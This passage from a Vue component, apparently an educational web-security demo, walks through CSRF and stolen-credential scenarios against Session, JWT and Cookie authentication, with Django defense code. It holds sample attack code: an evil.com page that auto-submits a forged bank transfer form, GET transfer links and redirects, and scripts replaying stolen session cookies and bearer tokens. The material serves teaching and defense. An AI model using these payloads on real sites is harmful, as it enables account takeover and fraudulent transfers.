          { time: '周五 09:16', icon: '🛡️', color: 'green', content: '与Session认证一样，SameSite=Lax成功阻止了跨站POST请求。但Cookie认证没有CSRF Token验证，如果SameSite被绕过则更危险' },
          { time: '周五 09:20', icon: '⚠️', color: 'orange', content: 'Cookie认证与Session的CSRF防护效果一致，但缺少CSRF Token这第二道防线。如果SameSite配置不当，风险更大' },
        ],
      },
      {
        title: '构造攻击', icon: '😈',
        desc: '攻击者在恶意网站上构造伪造请求，针对Cookie认证',
        attackCode: `<!-- 攻击者网站 evil.com 上的恶意页面 -->
<h1>恭喜你中奖了！点击领取</h1>

<!-- 尝试1：隐藏表单自动提交POST -->
<form id="csrf-form" action="https://bank.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="hacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.getElementById('csrf-form').submit();
  // ❌ SameSite=Lax阻止跨站POST携带Cookie
  // → 请求中没有access_token → 401 未认证
  
  // ⚠️ 但Cookie认证没有CSRF Token验证！
  // 如果SameSite被绕过（如配置为None），
  // 则没有任何第二道防线！
<\/script>

<!-- 🔴 尝试2：GET请求攻击（SameSite=Lax允许！） -->
<!-- 方式A：诱导用户点击链接 -->
<a href="https://bank.com/api/transfer?to=hacker&amount=10000">
  点击领取大奖
</a>
<!-- ⚠️ 用户点击后，浏览器会携带Cookie发送GET请求！
     SameSite=Lax允许顶级导航的GET请求携带Cookie
     Django CSRF中间件不检查GET请求 → 如果服务端用GET执行写操作，攻击成功！-->

<!-- 方式B：自动跳转 -->
<script>
  window.location = 'https://bank.com/api/transfer?to=hacker&amount=10000';
  // ⚠️ 顶级导航的GET请求，浏览器会携带Cookie！
  // CSRF中间件不检查GET → 服务端用GET执行写操作则攻击成功！
<\/script>`,
        codeExplain: 'POST请求被SameSite=Lax阻止，但GET请求可以携带Cookie！关键点：Django的CSRF中间件只检查POST/PUT/DELETE等写请求，不检查GET请求。如果服务端错误地用GET执行写操作（如转账、删除），攻击者可以诱导用户点击链接发起攻击',
      },
      {
        title: '攻击结果', icon: '💥',
        desc: 'CSRF攻击对Cookie认证的影响',
        resultType: 'warning',
        resultTitle: '🟡 部分防护 — SameSite=Lax阻止POST，但缺少CSRF Token第二道防线',
        resultDesc: '与Session认证一样，SameSite=Lax阻止了跨站POST请求携带Cookie。但Cookie认证通常没有CSRF Token验证，如果SameSite被绕过，则风险更大',
        flowLabel: '❌ Cookie被阻止',
        stolenData: `// CSRF攻击Cookie认证结果：

// 🟡 POST请求：SameSite=Lax阻止Cookie发送
//    请求中没有access_token → 401 未认证 ✅
//    ⚠️ 但如果SameSite=None或未设置，Cookie会被携带
//    → 没有CSRF Token验证 → 攻击成功！

// 🔴 GET请求：SameSite=Lax允许携带Cookie！
//    SameSite=Lax规则：
//    - POST请求 → 不携带Cookie ✅
//    - 顶级导航GET请求（点击链接、跳转）→ 携带Cookie ⚠️
//
//    攻击方式：
//    <a href="https://bank.com/api/transfer?to=hacker">点击领取</a>
//    window.location = 'https://bank.com/api/transfer?to=hacker'
//
//    用户点击后 → 浏览器携带Cookie发送GET请求
//    → Django CSRF中间件不检查GET请求
//    → 如果服务端用GET执行写操作，攻击成功！
//    → Session和Cookie认证风险相同（CSRF Token都不检查GET）

// 结论：Cookie认证的CSRF防护比Session更弱（仅针对POST）
//       POST请求：Session有CSRF Token第二道防线，Cookie没有
//       GET请求：两者风险相同，都需避免GET执行写操作！`,
      },
      {
        title: '防御方案', icon: '🛡️',
        desc: '了解如何防御CSRF攻击对Cookie认证的影响',
        defenseList: [
          'SameSite=Lax已配置（防护跨站POST请求）',
          '⚠️ GET请求防御：永远不要用GET执行写操作！',
          '敏感操作需二次确认（如输入密码/验证码）',
          '验证Referer/Origin请求头',
          'Secure标志仅HTTPS传输',
          '考虑增加CSRF Token验证（更严格）',
        ],
        defenseCode: `# 1. SameSite=Lax 已配置（当前项目）
response.set_cookie(
    key='access_token',
    value=token,
    samesite='Lax',   # POST跨站请求阻止
    httponly=True,     # 防XSS
    secure=True,       # 仅HTTPS
)

# 2. ⚠️ GET请求防御：永远不要用GET执行写操作！
# 注意：Django CSRF中间件不检查GET请求，所有认证方式都一样
# ❌ 错误：GET执行写操作
def delete_post(request):
    post_id = request.GET.get('id')
    Post.objects.filter(id=post_id).delete()  # 危险！

# ✅ 正确：用POST执行写操作
def delete_post(request):
    if request.method == 'POST':
        post_id = request.POST.get('id')
        Post.objects.filter(id=post_id).delete()

# 3. 敏感操作二次确认
def transfer(request):
    if request.method == 'POST':
        # 要求输入验证码
        code = request.POST.get('verify_code')
        if not verify_code(request.user, code):
            return HttpResponse('验证码错误')
        do_transfer(...)

# 4. 验证Referer/Origin头
def transfer(request):
    referer = request.META.get('HTTP_REFERER', '')
    if not referer.startswith('https://bank.com'):
        return HttpResponseForbidden('非法请求来源')

# 5. SameSite=Strict（最严格，阻止所有跨站请求）
response.set_cookie(
    key='access_token',
    samesite='Strict',  # 连点击链接都不会带Cookie
)`,
      },
    ],

    'theft-session': [
      {
        title: '了解攻击', icon: '📖',
        desc: '了解凭证泄露对Session认证的影响',
        alert: '⚠️ 危害：账号被完全控制，但Session可以即时撤销',
        target: '利用窃取的sessionid和csrftoken冒充用户',
        principle: '攻击者通过网络嗅探、日志泄露等途径获取Cookie中的sessionid和csrftoken。但Session存储在服务端，可以即时销毁使sessionid失效',
        story: [
          { time: '周三 15:00', icon: '👤', color: 'blue', content: '老板王总在公司咖啡馆使用公共WiFi登录StudyHub（Session认证），浏览器保存了sessionid和csrftoken Cookie' },
          { time: '周三 15:05', icon: '🕵️', color: 'red', content: '同WiFi下的攻击者阿杰使用网络嗅探工具捕获了王总的HTTP通信，提取到了Cookie中的sessionid和csrftoken' },
          { time: '周三 15:10', icon: '😈', color: 'red', content: '阿杰将sessionid和csrftoken设置到自己的浏览器Cookie中，成功冒充王总登录StudyHub并发起请求' },
          { time: '周三 15:30', icon: '🛡️', color: 'green', content: '王总发现异常后立即登出，服务端销毁Session数据，阿杰手中的sessionid立刻失效！' },
          { time: '周三 16:00', icon: '✅', color: 'green', content: 'Session认证最大的优势：可即时撤销！发现泄露后，一键登出就能让攻击者手中的凭证立刻失效' },
        ],
      },
      {
        title: '模拟泄露', icon: '🔓',
        desc: '模拟攻击者获取Session凭证后的场景',
        attackCode: `// 假设攻击者通过网络嗅探获取了Cookie中的凭证

// 🔴 攻击者获取了sessionid和csrftoken
const stolenSessionId = "abc123def456...";
const stolenCsrfToken = "xyz789...";

// 攻击者使用窃取的凭证冒充用户
// 方式1：设置到自己的浏览器Cookie中
document.cookie = "studyhub_sessionid=" + stolenSessionId;
document.cookie = "csrftoken=" + stolenCsrfToken;

// 方式2：用Python脚本发送请求
import requests
response = requests.get(
    'https://studyhub.com/api/posts/',
    cookies={
        'studyhub_sessionid': stolenSessionId,
        'csrftoken': stolenCsrfToken
    }
)
// ✅ 冒充成功！攻击者可以查看和操作用户数据
// POST请求需要同时携带csrftoken并设置X-CSRFToken请求头

// 🛡️ 但用户发现后可以即时撤销
// 用户点击"登出" → 服务端销毁Session
// → 攻击者手中的sessionid立刻失效！`,
        codeExplain: 'Session认证最大的优势是可即时撤销。服务端存储Session数据，调用logout()即可销毁，攻击者手中的sessionid立刻失效。注意：攻击者同时获取了sessionid和csrftoken，可以发起任何请求',
      },
      {
        title: '泄露影响', icon: '💥',
        desc: 'Session凭证泄露后的影响',
        resultType: 'warning',
        resultTitle: '🟡 凭证泄露但有即时恢复能力',
        resultDesc: 'Session凭证（sessionid和csrftoken）泄露后攻击者可以冒充用户，但用户发现后可以即时撤销Session，使攻击者手中的sessionid立刻失效。风险窗口极短',
        flowLabel: '窃取sessionid+csrftoken ➡️ 可即时撤销',
        stolenData: `// Session凭证泄露后的恢复能力：

// 🔴 泄露瞬间：攻击者获取了sessionid和csrftoken
//    可以冒充用户发起任何请求（GET/POST）
//    风险窗口：从泄露到发现

// ✅ 发现泄露后：即时撤销
//    1. 用户点击"登出"
//    2. 服务端调用 request.session.flush()
//    3. Session数据从数据库中删除
//    4. 攻击者手中的sessionid立刻失效！
//    5. csrftoken也随之失效（关联的Session已销毁）
//    风险窗口：几乎为零

// 对比Token认证：
//    Token泄露后无法撤销，只能等待过期
//    风险窗口：Token剩余有效期（最长60分钟）`,
      },
      {
        title: '防御方案', icon: '🛡️',
        desc: '了解如何减少Session凭证泄露的影响',
        defenseList: [
          '可即时撤销Session（最大优势）',
          '登录后重新生成Session ID',
          '监控异常Session活动',
          '设置合理过期时间',
          '使用HTTPS防止网络嗅探',
          '设置Secure标志仅HTTPS传输',
        ],
        defenseCode: `# 1. 即时撤销Session
def logout(request):
    request.session.flush()  # 销毁Session数据
    # 攻击者手中的sessionid立刻失效

# 2. 登录后重新生成Session ID
from django.contrib.auth import login

def login_view(request):
    user = authenticate(request, ...)
    if user:
        request.session.cycle_key()  # 重新生成Session ID
        login(request, user)

# 3. 设置Secure标志（生产环境）
response.set_cookie(
    key='studyhub_sessionid',
    value=session_key,
    secure=True,  # 仅HTTPS传输
)`,
      },
    ],

    'theft-token': [
      {
        title: '了解攻击', icon: '📖',
        desc: '了解凭证泄露对Token认证的影响',
        alert: '⚠️ 危害：Token泄露后无法主动撤销，攻击者可在过期前持续冒充用户',
        target: '利用窃取的JWT Token冒充用户',
        principle: '攻击者获取JWT Token后，可以在任何设备上冒充用户。JWT是无状态的，服务端不存储Token，无法主动使其失效',
        story: [
          { time: '周三 15:00', icon: '👤', color: 'blue', content: '老板王总在公司咖啡馆使用公共WiFi登录StudyHub（Token认证），Token存储在localStorage中' },
          { time: '周三 15:05', icon: '🕵️', color: 'red', content: '同WiFi下的攻击者阿杰使用网络嗅探工具捕获了王总的HTTP通信，提取到了完整的access_token和refresh_token' },
          { time: '周三 15:10', icon: '😈', color: 'red', content: '阿杰使用Python脚本将窃取的Token设置到Authorization头中，成功冒充王总登录StudyHub' },
          { time: '周三 15:30', icon: '😱', color: 'red', content: '王总发现异常，但无法主动撤销Token！JWT是无状态的，服务端不存储Token，只能等待自然过期（60分钟）' },
          { time: '周三 16:30', icon: '⚠️', color: 'orange', content: '60分钟后access_token终于过期，但阿杰用refresh_token获取了新的access_token，继续冒充王总！风险窗口长达7天' },
        ],
      },
      {
        title: '模拟泄露', icon: '🔓',
        desc: '模拟攻击者获取JWT Token后的场景',
        attackCode: `// 假设攻击者通过网络嗅探获取了JWT Token

// 🔴 攻击者获取了access_token和refresh_token
const stolenAccessToken = "${accessToken ? accessToken.substring(0, 30) + '...' : 'eyJhbGciOiJIUzI1NiIs...'}";
const stolenRefreshToken = "${refreshToken ? refreshToken.substring(0, 30) + '...' : 'eyJhbGciOiJIUzI1NiIs...'}";

// 攻击者使用窃取的Token冒充用户
fetch('https://studyhub.com/api/posts/', {
    method: 'POST',
    headers: {
        'Authorization': \`Bearer \${stolenAccessToken}\`,
    },
    body: JSON.stringify({
        title: '冒充用户发的帖子',
        content: 'Token泄露后被攻击'
    })
});
// ✅ 冒充成功！

// ❌ 用户发现后无法主动撤销Token！
// JWT是无状态的，服务端不存储Token
// 只能等待自然过期（access_token: 60分钟）
// 而且攻击者可以用refresh_token续期（7天）`,
        codeExplain: 'JWT Token最大的安全风险：无法主动撤销。Token签发后，在过期之前一直有效。攻击者获取Token后，可以在过期前持续冒充用户',
      },
      {
        title: '泄露影响', icon: '💥',
        desc: 'Token凭证泄露后的影响',
        resultType: 'danger',
        resultTitle: '🔴 高危 — Token泄露后无法主动撤销',
        resultDesc: 'JWT Token签发后无法主动撤销，只能等待自然过期。攻击者在过期前可持续冒充用户。使用refresh_token续期后，风险窗口可长达7天',
        flowLabel: '窃取Token ➡️ 无法撤销',
        stolenData: `// Token凭证泄露后的恢复能力：

// 🔴 泄露瞬间：攻击者可以冒充用户
//    风险窗口：从泄露到Token过期

// ❌ 发现泄露后：无法主动撤销
//    1. 用户"登出"只是删除本地Token
//    2. 攻击者手中的Token仍然有效！
//    3. 只能等待access_token自然过期（60分钟）
//    4. 攻击者可用refresh_token续期（7天）
//
//    风险窗口：最长7天！

// 对比Session认证：
//    Session泄露后可即时撤销
//    风险窗口：几乎为零`,
      },
      {
        title: '防御方案', icon: '🛡️',
        desc: '了解如何减少Token凭证泄露的影响',
        defenseList: [
          '缩短Access Token有效期（15分钟）',
          '实现Token黑名单机制',
          '使用Refresh Token轮换',
          '绑定设备指纹',
          '使用HTTPS防止网络嗅探',
          '监控异常Token使用',
        ],
        defenseCode: `# 1. 缩短Token有效期
SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(minutes=15),
    'REFRESH_TOKEN_LIFETIME': timedelta(days=1),
}

# 2. 实现Token黑名单
from rest_framework_simplejwt.token_blacklist.models import BlacklistedToken

def revoke_token(token):
    BlacklistedToken.objects.create(token=token)

# 3. Refresh Token轮换
SIMPLE_JWT = {
    'ROTATE_REFRESH_TOKENS': True,
    'BLACKLIST_AFTER_ROTATION': True,
}
# 每次刷新后旧refresh_token失效
# 攻击者无法持续续期`,
      },
    ],

    'theft-cookie': [
      {
        title: '了解攻击', icon: '📖',
        desc: '了解凭证泄露对Cookie认证的影响',
        alert: '⚠️ 危害：Cookie中的Token泄露后无法主动撤销，但可缩短有效期减少风险窗口',
        target: '利用窃取的Cookie中的Token冒充用户',
        principle: 'Cookie中的access_token本质是JWT Token，泄露后与Token认证一样无法主动撤销。但Cookie有效期可以设置较短，减少风险窗口',
        story: [
          { time: '周三 15:00', icon: '👤', color: 'blue', content: '老板王总在公司咖啡馆使用公共WiFi登录StudyHub（Cookie认证），浏览器保存了含access_token的Cookie' },
          { time: '周三 15:05', icon: '🕵️', color: 'red', content: '同WiFi下的攻击者阿杰使用网络嗅探工具捕获了王总的HTTP通信，提取到了Cookie中的access_token' },
          { time: '周三 15:10', icon: '😈', color: 'red', content: '阿杰将窃取的access_token设置到自己的请求中，成功冒充王总登录StudyHub' },
          { time: '周三 15:30', icon: '⚠️', color: 'orange', content: '王总发现异常后登出，服务端删除了Cookie，但阿杰手中的Token仍有效！Cookie认证的Token也是JWT，无法主动撤销' },
          { time: '周三 16:30', icon: '🟡', color: 'orange', content: '不过Cookie的access_token有效期只有1小时（比localStorage的60分钟更短），风险窗口有限。可以通过缩短Cookie有效期来减少风险' },
        ],
      },
      {
        title: '模拟泄露', icon: '🔓',
        desc: '模拟攻击者获取Cookie中Token后的场景',
        attackCode: `// 假设攻击者通过网络嗅探获取了Cookie中的Token

// 🔴 攻击者获取了Cookie中的access_token
const stolenAccessToken = "eyJhbGciOiJIUzI1NiIs...";

// 攻击者使用窃取的Token冒充用户
// 方式1：设置到自己的Cookie中
document.cookie = "access_token=" + stolenAccessToken;

// 方式2：直接在请求头中使用
fetch('https://studyhub.com/api/posts/', {
    method: 'POST',
    headers: {
        'Authorization': \`Bearer \${stolenAccessToken}\`,
    },
    body: JSON.stringify({
        title: '冒充用户发的帖子',
        content: 'Cookie中的Token泄露'
    })
});
// ✅ 冒充成功！

// ❌ 用户发现后无法主动撤销Token
// Cookie中的Token本质是JWT，无法主动撤销
// 但Cookie有效期可以设置较短（如30分钟）
// 减少风险窗口`,
        codeExplain: 'Cookie认证的Token本质是JWT，泄露后与Token认证一样无法主动撤销。但可以通过缩短Cookie有效期来减少风险窗口',
      },
      {
        title: '泄露影响', icon: '💥',
        desc: 'Cookie凭证泄露后的影响',
        resultType: 'warning',
        resultTitle: '🟡 部分可控 — 无法撤销但可缩短有效期',
        resultDesc: 'Cookie中的Token泄露后无法主动撤销，但可以通过缩短Cookie有效期来减少风险窗口。比Token认证稍好，但不如Session认证可即时撤销',
        flowLabel: '窃取Token ➡️ 可缩短有效期',
        stolenData: `// Cookie凭证泄露后的恢复能力：

// 🔴 泄露瞬间：攻击者可以冒充用户
//    风险窗口：从泄露到Token过期

// ❌ 发现泄露后：无法主动撤销Token
//    1. 用户"登出"只是删除浏览器Cookie
//    2. 攻击者手中的Token仍然有效！
//    3. 只能等待Token自然过期
//
//    风险窗口：Cookie过期时间（1小时）

// 🟡 缓解措施：缩短Cookie有效期
//    access_token Cookie: 30分钟（可调整）
//    refresh_token Cookie: 1天（可调整）
//    → 减少风险窗口

// 对比：
//    Session认证：可即时撤销 ✅
//    Cookie认证：无法撤销，但可缩短有效期 🟡
//    Token认证：无法撤销，有效期固定 🔴`,
      },
      {
        title: '防御方案', icon: '🛡️',
        desc: '了解如何减少Cookie凭证泄露的影响',
        defenseList: [
          '缩短Cookie有效期（最重要）',
          'Secure标志仅HTTPS传输',
          '绑定IP/设备信息',
          '实现服务端Token黑名单',
          '监控异常Token使用',
          '使用HTTPS防止网络嗅探',
        ],
        defenseCode: `# 1. 缩短Cookie有效期
response.set_cookie(
    key='access_token',
    value=token,
    max_age=30*60,  # 30分钟
    httponly=True,
    secure=True,
    samesite='Lax',
)
response.set_cookie(
    key='refresh_token',
    value=refresh_token,
    max_age=24*3600,  # 1天
    httponly=True,
    secure=True,
    samesite='Lax',
)

# 2. 实现Token黑名单
from rest_framework_simplejwt.token_blacklist.models import BlacklistedToken

def revoke_token(token):
    BlacklistedToken.objects.create(token=token)

# 3. 绑定设备信息
# 在Token中添加设备指纹，验证时比对
# 如果设备不匹配则拒绝请求`,
      },
    ],
  }

  return allSteps[key] || allSteps['xss-session']
})

const nextStep = () => {
  if (currentStep.value < 3) {
    currentStep.value++
  } else {
    router.push('/auth-security')
  }
}

const skipDemo = () => {
  currentStep.value = 3
}

onMounted(() => {
  if (!['xss', 'csrf', 'theft'].includes(attackType.value)) {
    router.push('/auth-security')
  }
  if (!['session', 'token', 'cookie'].includes(authType.value)) {
    router.push('/auth-security')
  }
})
</script>

<style scoped>
.code-block {
  background: #f5f5f5;
  padding: 12px;
  border-radius: 6px;
  font-size: 12px;
  line-height: 1.6;
  white-space: pre-wrap;
  word-break: break-all;
  font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
}

.flow-diagram {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 4px;
}

.flow-node {
  width: 100%;
  padding: 12px;
  border: 2px solid #d9d9d9;
  border-radius: 8px;
  text-align: center;
  transition: all 0.3s;
  opacity: 0.5;
}

.flow-node.active {
  opacity: 1;
  transform: scale(1.05);
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
}

.flow-arrow {
  font-size: 14px;
  color: #999;
  transition: all 0.3s;
}

.flow-arrow.active {
  color: #ff4d4f;
  font-weight: bold;
}

.flow-icon {
  font-size: 20px;
  display: block;
  margin-bottom: 4px;
}
</style>
